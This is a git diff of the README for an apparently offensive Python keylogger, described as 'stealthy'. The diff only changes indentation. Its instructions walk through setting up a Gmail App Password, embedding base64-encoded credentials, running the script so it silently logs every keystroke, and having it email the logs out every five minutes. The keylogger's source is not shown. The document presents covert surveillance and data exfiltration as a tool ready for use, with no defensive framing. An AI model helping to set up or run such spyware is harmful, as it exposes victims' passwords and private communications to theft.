@@ -23,13 +23,13 @@ A stealthy Python-based keylogger that captures keystrokes and exfiltrates data 
 
     Go to https://myaccount.google.com/security
 
-    Turn on 2FA
+Turn on 2FA
 
-    Generate a 16-character App Password for "Mail"
+Generate a 16-character App Password for "Mail"
 
 2.Edit the Script
 
-    Replace the encoded_email and encoded_pass fields with your base64-encoded credentials:
+Replace the encoded_email and encoded_pass fields with your base64-encoded credentials:
 
     import base64
     print(base64.b64encode(b"your_email@gmail.com"))
@@ -37,16 +37,16 @@ A stealthy Python-based keylogger that captures keystrokes and exfiltrates data 
 
 3.Run it
 
-python red_keylogger.py
+    python red_keylogger.py
 
-    Will silently log all keys
+Will silently log all keys
 
-    Sends logs via email every 5 minutes
+Sends logs via email every 5 minutes
 
 4.Stop it
 
     Press Ctrl+C in terminal
 
-    Or kill from Task Manager / ps command
+Or kill from Task Manager / ps command
 
 
